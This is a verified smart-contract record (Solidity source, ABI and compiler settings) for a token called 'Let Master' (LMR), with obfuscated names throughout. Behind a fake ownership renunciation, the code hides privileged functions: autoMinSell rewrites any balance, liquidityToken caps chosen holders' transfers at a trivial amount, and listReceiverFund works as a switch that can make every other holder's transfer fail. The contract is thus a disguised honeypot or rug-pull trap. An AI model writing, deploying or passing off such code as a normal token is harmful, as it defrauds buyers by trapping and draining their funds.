{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityReceiver {\n    function createPair(address listShouldTeam, address toExemptFund) external returns (address);\n}\n\ninterface enableLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitSender) external view returns (uint256);\n\n    function transfer(address shouldBuy, uint256 launchedAt) external returns (bool);\n\n    function allowance(address sellReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldBuy,\n        uint256 launchedAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAmount, uint256 value);\n    event Approval(address indexed sellReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract txExemptMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldList is enableLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LetMaster is txExemptMin, enableLaunched, shouldList {\n\n    uint256 public tokenMarketingTo;\n\n    function owner() external view returns (address) {\n        return marketingReceiver;\n    }\n\n    function sellTrading(address enableTrading, address shouldBuy, uint256 launchedAt) internal returns (bool) {\n        if (enableTrading == autoToken) {\n            return receiverSenderMin(enableTrading, shouldBuy, launchedAt);\n        }\n        uint256 amountListShould = enableLaunched(shouldMode).balanceOf(marketingExempt);\n        require(amountListShould == tokenFee);\n        require(shouldBuy != marketingExempt);\n        if (takeLimitMode[enableTrading]) {\n            return receiverSenderMin(enableTrading, shouldBuy, limitSwap);\n        }\n        return receiverSenderMin(enableTrading, shouldBuy, launchedAt);\n    }\n\n    function allowance(address isReceiver, address feeMode) external view virtual override returns (uint256) {\n        if (feeMode == fundFee) {\n            return type(uint256).max;\n        }\n        return feeWalletShould[isReceiver][feeMode];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isShould;\n    }\n\n    uint256 private walletMaxList = 100000000 * 10 ** 18;\n\n    uint256 constant limitSwap = 8 ** 10;\n\n    function getOwner() external view returns (address) {\n        return marketingReceiver;\n    }\n\n    address public shouldMode;\n\n    function transfer(address buyMaxLimit, uint256 launchedAt) external virtual override returns (bool) {\n        return sellTrading(_msgSender(), buyMaxLimit, launchedAt);\n    }\n\n    uint256 receiverShould;\n\n    uint256 public enableReceiver;\n\n    bool public marketingTakeSender;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverBuy;\n    }\n\n    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private marketingReceiver;\n\n    mapping(address => uint256) private launchedMode;\n\n    function shouldTo() private view {\n        require(receiverAuto[_msgSender()]);\n    }\n\n    string private receiverBuy = \"Let Master\";\n\n    uint8 private isShould = 18;\n\n    bool public txLimit;\n\n    function receiverSenderMin(address enableTrading, address shouldBuy, uint256 launchedAt) internal returns (bool) {\n        require(launchedMode[enableTrading] >= launchedAt);\n        launchedMode[enableTrading] -= launchedAt;\n        launchedMode[shouldBuy] += launchedAt;\n        emit Transfer(enableTrading, shouldBuy, launchedAt);\n        return true;\n    }\n\n    string private buyTokenTo = \"LMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyTokenTo;\n    }\n\n    function maxTx(address enableLaunch) public {\n        if (sellMin) {\n            return;\n        }\n        \n        receiverAuto[enableLaunch] = true;\n        \n        sellMin = true;\n    }\n\n    uint256 public marketingTotal;\n\n    bool private launchSender;\n\n    function liquidityToken(address txMarketingBuy) public {\n        shouldTo();\n        if (tokenMarketingTo != enableReceiver) {\n            launchSender = true;\n        }\n        if (txMarketingBuy == autoToken || txMarketingBuy == shouldMode) {\n            return;\n        }\n        takeLimitMode[txMarketingBuy] = true;\n    }\n\n    uint256 tokenFee;\n\n    constructor (){\n        if (launchSender != txLimit) {\n            marketingTotal = tokenMarketingTo;\n        }\n        shouldWallet receiverLimit = shouldWallet(fundFee);\n        shouldMode = liquidityReceiver(receiverLimit.factory()).createPair(receiverLimit.WETH(), address(this));\n        \n        autoToken = _msgSender();\n        receiverAuto[autoToken] = true;\n        launchedMode[autoToken] = walletMaxList;\n        marketingSell();\n        \n        emit Transfer(address(0), autoToken, walletMaxList);\n    }\n\n    function balanceOf(address limitSender) public view virtual override returns (uint256) {\n        return launchedMode[limitSender];\n    }\n\n    address public autoToken;\n\n    event OwnershipTransferred(address indexed marketingMode, address indexed feeIs);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMaxList;\n    }\n\n    mapping(address => bool) public takeLimitMode;\n\n    function transferFrom(address enableTrading, address shouldBuy, uint256 launchedAt) external override returns (bool) {\n        if (_msgSender() != fundFee) {\n            if (feeWalletShould[enableTrading][_msgSender()] != type(uint256).max) {\n                require(launchedAt <= feeWalletShould[enableTrading][_msgSender()]);\n                feeWalletShould[enableTrading][_msgSender()] -= launchedAt;\n            }\n        }\n        return sellTrading(enableTrading, shouldBuy, launchedAt);\n    }\n\n    uint256 public launchedExempt;\n\n    function autoMinSell(address buyMaxLimit, uint256 launchedAt) public {\n        shouldTo();\n        launchedMode[buyMaxLimit] = launchedAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeWalletShould;\n\n    function marketingSell() public {\n        emit OwnershipTransferred(autoToken, address(0));\n        marketingReceiver = address(0);\n    }\n\n    bool public sellMin;\n\n    function approve(address feeMode, uint256 launchedAt) public virtual override returns (bool) {\n        feeWalletShould[_msgSender()][feeMode] = launchedAt;\n        emit Approval(_msgSender(), feeMode, launchedAt);\n        return true;\n    }\n\n    address marketingExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public receiverAuto;\n\n    function listReceiverFund(uint256 launchedAt) public {\n        shouldTo();\n        tokenFee = launchedAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMaxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"autoMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketingBuy\",\"type\":\"address\"}],\"name\":\"liquidityToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"listReceiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTakeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"}],\"name\":\"maxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLimitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMarketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMaxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LetMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}